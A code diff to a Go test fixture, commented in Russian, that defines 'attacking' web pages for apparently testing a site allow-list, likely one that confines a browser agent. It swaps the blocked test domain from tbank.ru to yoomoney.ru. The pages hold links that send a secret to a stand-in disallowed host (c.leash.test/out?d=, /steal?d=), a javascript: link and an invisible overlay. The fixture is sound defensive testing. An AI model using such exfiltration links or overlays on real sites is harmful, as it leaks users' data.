@@ -1,7 +1,8 @@
 package main
 
 // Атакующие страницы. a и b — разрешённые сайты, c — не разрешён (его хиты
-// означают утечку), www.tbank.ru — во встроенном запрете.
+// означают утечку), yoomoney.ru — во встроенном запрете. Домен из запрета
+// нужен вне HSTS preload: иначе Firefox не примет тестовый сертификат.
 
 const secret = "SECRET-7731"
 
@@ -49,7 +50,7 @@ https://c.leash.test/steal?d=`+secret+`</p>
 <div style="position:fixed;inset:0;background:transparent;z-index:10"></div>`),
 		"/links": doc("A: ссылки", `<a href="https://c.leash.test/out?d=`+secret+`">Ссылка-на-c</a>
 <a href="javascript:void(document.title='pwned')">Ссылка-js</a>
-<a href="https://www.tbank.ru/">Ссылка-tbank</a>
+<a href="https://yoomoney.ru/">Ссылка-yoomoney</a>
 <a href="https://b.leash.test/?d=`+secret+`">Ссылка-на-b-с-данными</a>
 <p>`+secret+`</p>`),
 		"/select": doc("A: список", `<select aria-label="Страна"><option value="ru">Россия</option><option value="rs">Сербия</option></select>
@@ -62,8 +63,8 @@ https://c.leash.test/steal?d=`+secret+`</p>
 	"c.leash.test": {
 		"/": doc("C", `<h1>Сайт C (не разрешён)</h1><p>Секрет C: C-PRIVATE-42</p>`),
 	},
-	"www.tbank.ru": {
-		"/": doc("Т-Банк", `<h1>Т-Банк</h1><p>Баланс: 1000</p>`),
+	"yoomoney.ru": {
+		"/": doc("ЮMoney", `<h1>ЮMoney</h1><p>Баланс: 1000</p>`),
 	},
 }
 
